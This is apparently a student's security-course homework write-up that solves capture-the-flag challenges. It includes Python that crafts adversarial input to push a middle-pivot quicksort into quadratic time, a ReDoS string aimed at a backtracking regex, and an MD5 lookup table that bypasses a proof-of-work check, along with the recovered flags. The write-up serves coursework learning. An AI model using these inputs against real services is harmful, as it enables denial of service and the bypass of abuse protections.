# NASA HW5



# Securiy



## 2. Proof of Work & DoS 



### 3.

> Refs:
>
> b09902011 陳可邦

Flag: `HW5{c4ts_ar3_a_1ot_cut3r_th4n_柴魚}`

Be reading `server.py`, we know that the flag will be shown if `qsort()` runs slow enough, and the implementation chooses pivot from the middle of the array. Therefore we can construct an input  that forces `qsort()` run in quadratic time. The "evil" input looks something like this: `... 7 5 3 1 2 4 6 ...`

I add the following lines before `interactive(s)` in `example.py`:

```python
case_str = "1"
for i in range(2, 7200):
    if i%2 == 0:
        case_str = case_str+f" {i}"
    else:
        case_str = f"{i} "+case_str
sendLine(s, "1")
print("")
print(recvUntil(s, ': ').decode(), end='')
print("")
sendLine(s, case_str)
print("")
```

Then just run `python example.py`.

### 4.

> Refs:
>
> b09902011 陳可邦
> https://medium.com/swlh/exploiting-redos-d610e8ba531

Flag: `HW5{柴魚柴油乾柴烈火火柴砍柴柴米油鹽醬醋茶留得青山在不怕沒柴燒}`

In `server.py`, we can find this regex expression: `^Dear Sophia, (.*柴魚){10,15}.*\. Best wishes, ([a-zA-Z0-9]+ ?)+\.$`. The exploitable part is `([a-zA-Z0-9]+ ?)+`. 

mail: `Dear Sophia, 柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚. Best wishes, 123456789012345678901234567890@.`





### 5.

> Refs:
>
> b09902011 陳可邦

Flag: `HW5{y0u_shou1d_w0rk_unt1l_4.am_wi7h_m3_ev3ry_d4y!}`

Certificate: `1757775784||246.7744634760556||08c0f1498914fcbfdb351c61eff3d84e8a6e11d348f51d38ce69c159233f02c6`

Because `proof_of_work()` the random number fed to hash only ranges from 0 to 2^24-1, we can generate a table to use hashed values to lookup prehashed values.

Codes to generate lookup table:

```python
import json, hashlib
rainbow = dict()

for i in range(2**24):
    hashed_i = hashlib.md5(f'{i}'.encode()).hexdigest()[0:8]
    rainbow[hashed_i] = i

jdata = json.dumps(rainbow)
with open('rainbow.json', 'w') as f:
    f.write(jdata)
```

Added lines in `example.py`

```python
with open('rainbow.json') as json_file:
    rainbow = json.load(json_file)
sendLine(s, "3")
for i in range(10):
    task = recvUntil(s, ': ').decode()
    print(task, end='')
    q = task[-12:-4]
    sendLine(s, str(rainbow[q]))
    print(q, str(rainbow[q]))
```

